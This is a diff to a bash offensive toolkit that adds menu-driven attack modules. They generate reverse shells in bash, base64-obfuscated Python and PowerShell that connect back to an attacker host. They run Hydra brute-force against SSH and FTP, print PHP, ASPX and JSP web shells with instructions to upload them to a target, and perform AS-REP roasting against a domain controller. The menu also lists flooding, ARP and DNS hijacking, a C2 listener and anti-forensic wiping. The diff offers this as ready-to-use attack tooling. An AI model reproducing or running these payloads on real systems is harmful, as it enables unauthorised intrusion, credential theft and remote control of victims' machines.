@@ -237,6 +237,87 @@ discord_notify() {
     curl -H "Content-Type: application/json" -X POST -d "{\"content\": \"[☠] $1\"}" "$DISCORD_WEBHOOK" > /dev/null 2>&1
 }
 
+# --- ACTIVE EXPLOITATION MODULES ---
+
+wraith_shells() {
+    echo -e "${NEON_PINK}[!] WRAITH: OBFUSCATED REVERSE SHELL GENERATOR${RESET}"
+    echo -ne "${NEON_BLUE}    Enter LHOST (Your IP): ${RESET}"; read lhost
+    echo -ne "${NEON_BLUE}    Enter LPORT (Your Port): ${RESET}"; read lport
+    
+    echo -e "\n${NEON_BLUE}[+] BASH (TCP):${RESET}"
+    echo -e "bash -i >& /dev/tcp/$lhost/$lport 0>&1"
+    
+    echo -e "\n${NEON_BLUE}[+] PYTHON (TCP/OBFUSCATED):${RESET}"
+    local py_shell="import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('$lhost',$lport));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);"
+    echo -e "python -c \"exec('$(echo -n "$py_shell" | base64 | tr -d '\n')'.decode('base64'))\""
+    
+    echo -e "\n${NEON_BLUE}[+] POWERSHELL (TCP):${RESET}"
+    echo -e "\$client = New-Object System.Net.Sockets.TCPClient('$lhost',$lport);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()"
+}
+
+havoc_brute() {
+    echo -e "${NEON_PINK}[!] HAVOC: SERVICE BRUTE-FORCE ORCHESTRATOR${RESET}"
+    local t=$1
+    if [ -z "$t" ]; then echo -ne "${NEON_BLUE}    Target IP: ${RESET}"; read t; fi
+    
+    echo -e "${NEON_BLUE}[*] Detecting exposed credential-based services on $t...${RESET}"
+    local open_ports=$(nmap -Pn -T4 -p 21,22,3306,5900,3389 --open -oG - "$t" | grep "Ports:" | sed 's/.*Ports: //')
+    
+    if [ -z "$open_ports" ]; then
+        echo -e "${NEON_PINK}[-] No common brute-forceable ports detected.${RESET}"
+        return
+    fi
+    
+    echo -e "${NEON_BLUE}[+] Detected open ports: $open_ports${RESET}"
+    echo -ne "${NEON_BLUE}    Launch Hydra? (y/n): ${RESET}"; read run_hydra
+    if [[ "$run_hydra" == "y" ]]; then
+        # Defaulting to common rockyou list or fallback
+        local wordlist="/usr/share/wordlists/rockyou.txt"
+        if [ ! -f "$wordlist" ]; then wordlist="/usr/share/john/password.lst"; fi
+        
+        if echo "$open_ports" | grep -q "22/open/tcp//ssh"; then
+            echo -e "${NEON_PINK}[!] Brute-forcing SSH (Port 22)...${RESET}"
+            hydra -l root -P "$wordlist" ssh://"$t" -t 4 -vV -I
+        fi
+        if echo "$open_ports" | grep -q "21/open/tcp//ftp"; then
+            echo -e "${NEON_PINK}[!] Brute-forcing FTP (Port 21)...${RESET}"
+            hydra -l admin -P "$wordlist" ftp://"$t" -t 4 -vV -I
+        fi
+    fi
+}
+
+blackgate_webshells() {
+    echo -e "${NEON_PINK}[!] BLACKGATE: WEB SHELL LIBRARY${RESET}"
+    echo -e "${NEON_BLUE}[+] TINY PHP SHELL:${RESET}"
+    echo -e "<?php system(\$_GET['cmd']); ?>"
+    
+    echo -e "\n${NEON_BLUE}[+] TINY ASPX SHELL:${RESET}"
+    echo -e '<%@ Page Language="Jscript"%><%eval(Request.Item["cmd"])%>'
+    
+    echo -e "\n${NEON_BLUE}[+] TINY JSP SHELL:${RESET}"
+    echo -e '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>'
+    
+    echo -e "\n${NEON_BLUE}[*] Usage: Upload to target and access via http://target/shell.ext?cmd=whoami${RESET}"
+}
+
+breacher_ad() {
+    echo -e "${NEON_PINK}[!] BREACHER: ACTIVE DIRECTORY COMPROMISE (IMPACKET)${RESET}"
+    echo -ne "${NEON_BLUE}    Domain Controller IP: ${RESET}"; read dc_ip
+    echo -ne "${NEON_BLUE}    Domain Name (e.g., local.corp): ${RESET}"; read domain
+    
+    if ! command -v GetNPUsers.py &> /dev/null; then
+        echo -e "${NEON_PINK}[!] Impacket tools not found in PATH. Please install impacket-scripts.${RESET}"
+        return
+    fi
+    
+    echo -e "\n${NEON_BLUE}[1] AS-REP Roasting (No Auth Required)${RESET}"
+    echo -e "${NEON_BLUE}[*] Requesting TGTs for accounts without pre-authentication...${RESET}"
+    GetNPUsers.py "$domain/" -dc-ip "$dc_ip" -no-pass -format hashcat
+    
+    echo -e "\n${NEON_BLUE}[2] Anonymous LDAP Null Session Check${RESET}"
+    ldapsearch -x -h "$dc_ip" -s base -b ""
+}
+
 # --- CORE ATTACK & RECON MODULES ---
 
 rust_scan() {
@@ -735,15 +816,20 @@ gui_warfare() {
     while true; do
         show_banner
         echo -e " ${NEON_BLUE}┌─ CYBER WARFARE OPERATIONS ──────────────────────────────────┐${RESET}"
-        echo -e " ${NEON_BLUE}│${RESET} [F] MULTI-FLOOD     [G] AGGRESSIVE ARP  [J] VULN SCAN (NUC) ${NEON_BLUE}│${RESET}"
-        echo -e " ${NEON_BLUE}│${RESET} [L] WEB FUZZ (FFUF) [N] SQL INJECT TEST [Y] MALWARE (YARA)  ${NEON_BLUE}│${RESET}"
-        echo -e " ${NEON_BLUE}│${RESET} [Z] DEPLOY HONEYPOT [T] TAKEOVER AUDIT  [V] BRUTE FORCE     ${NEON_BLUE}│${RESET}"
-        echo -e " ${NEON_BLUE}│${RESET} [R] HASH CRACKER    [Q] PAYLOAD GEN     [@] GHOST WIPE      ${NEON_BLUE}│${RESET}"
-        echo -e " ${NEON_BLUE}│${RESET} [#] C2 LISTENER     [$] DNS HIJACK      [W] WP AUDIT        ${NEON_BLUE}│${RESET}"
+        echo -e " ${NEON_BLUE}│${RESET} [W] WRAITH: SHELL GEN [H] HAVOC: BRUTE-FORCE [B] BLACKGATE  ${NEON_BLUE}│${RESET}"
+        echo -e " ${NEON_BLUE}│${RESET} [A] BREACHER: AD ROAST[F] MULTI-FLOOD        [G] ARP ATTACK ${NEON_BLUE}│${RESET}"
+        echo -e " ${NEON_BLUE}│${RESET} [J] VULN SCAN (NUC)   [L] WEB FUZZ (FFUF)    [N] SQL INJECT ${NEON_BLUE}│${RESET}"
+        echo -e " ${NEON_BLUE}│${RESET} [Y] MALWARE (YARA)    [Z] DEPLOY HONEYPOT    [T] TAKEOVER   ${NEON_BLUE}│${RESET}"
+        echo -e " ${NEON_BLUE}│${RESET} [R] HASH CRACKER      [Q] PAYLOAD GEN        [@] GHOST WIPE ${NEON_BLUE}│${RESET}"
+        echo -e " ${NEON_BLUE}│${RESET} [#] C2 LISTENER       [$] DNS HIJACK         [X] WP AUDIT   ${NEON_BLUE}│${RESET}"
         echo -e " ${NEON_BLUE}└─────────────────────────────────────────────────────────────┘${RESET}"
         echo -ne " ${NEON_BLUE}[#] SELECT MODE (or 'b' for back) > ${RESET}"
         read sub; if [[ "$sub" == "b" ]]; then return; fi
         case $sub in
+            W|w) bash "$0" wraith; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
+            H|h) bash "$0" havoc; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
+            B|b) bash "$0" blackgate; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
+            A|a) bash "$0" breacher; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
             F|f) echo -ne "    Target IP: "; read t; bash "$0" flood "$t"; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
             G|g) bash "$0" arp; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
             J|j) echo -ne "    Target: "; read t; bash "$0" nuclei "$t"; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
@@ -752,13 +838,12 @@ gui_warfare() {
             Y|y) echo -ne "    File/Dir: "; read t; bash "$0" yara "$t"; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
             Z|z) echo -ne "    Port: "; read t; bash "$0" honeypot "$t"; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
             T|t) echo -ne "    Domain: "; read t; bash "$0" takeover "$t"; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
-            V|v) echo -ne "    Target IP: "; read t; bash "$0" brute "$t"; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
             R|r) echo -ne "    Hash File: "; read t; bash "$0" crack "$t"; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
             Q|q) echo -ne "    LHOST IP: "; read t; bash "$0" payload "$t"; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
             '@') anti_forensics; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
             '#') c2_listener; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
             '$') dns_hijack; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
-            W|w) echo -ne "    WP URL: "; read t; bash "$0" wpscan "$t"; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
+            X|x) echo -ne "    WP URL: "; read t; bash "$0" wpscan "$t"; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
         esac
     done
 }
@@ -942,6 +1027,10 @@ elif [[ "$TARGET" == "flock_manual" ]]; then TYPE="FLOCK_MANUAL"; TARGET=$EXTRA;
 elif [[ "$TARGET" == "flock_sync" ]]; then TYPE="FLOCK_SYNC"; TARGET=$EXTRA;
 elif [[ "$TARGET" == "flock_watch" ]]; then TYPE="FLOCK_WATCH"; TARGET=$EXTRA;
 elif [[ "$TARGET" == "flock_deep" ]]; then TYPE="FLOCK_DEEP"; TARGET=$EXTRA;
+elif [[ "$TARGET" == "wraith" ]]; then TYPE="WRAITH"; TARGET=$EXTRA;
+elif [[ "$TARGET" == "havoc" ]]; then TYPE="HAVOC"; TARGET=$EXTRA;
+elif [[ "$TARGET" == "blackgate" ]]; then TYPE="BLACKGATE"; TARGET=$EXTRA;
+elif [[ "$TARGET" == "breacher" ]]; then TYPE="BREACHER"; TARGET=$EXTRA;
 elif [[ "$TARGET" == "nuclei" ]]; then TYPE="NUCLEI"; TARGET=$EXTRA;
 elif [[ "$TARGET" == "user" ]]; then TYPE="USER_TRACE"; TARGET=$EXTRA;
 elif [[ "$TARGET" == "fuzz" ]]; then TYPE="FUZZ"; TARGET=$EXTRA;
@@ -1015,6 +1104,10 @@ case $TYPE in
     FLOCK_SYNC) flock_community_sync ;;
     FLOCK_WATCH) flock_traffic_watch ;;
     FLOCK_DEEP) flock_fingerprint_deep ;;
+    WRAITH) wraith_shells ;;
+    HAVOC) havoc_brute "$TARGET" ;;
+    BLACKGATE) blackgate_webshells ;;
+    BREACHER) breacher_ad ;;
     NUCLEI) vuln_scan "$TARGET" ;;
     USER_TRACE) user_trace "$TARGET" ;;
     FUZZ) web_fuzz "$TARGET" ;;
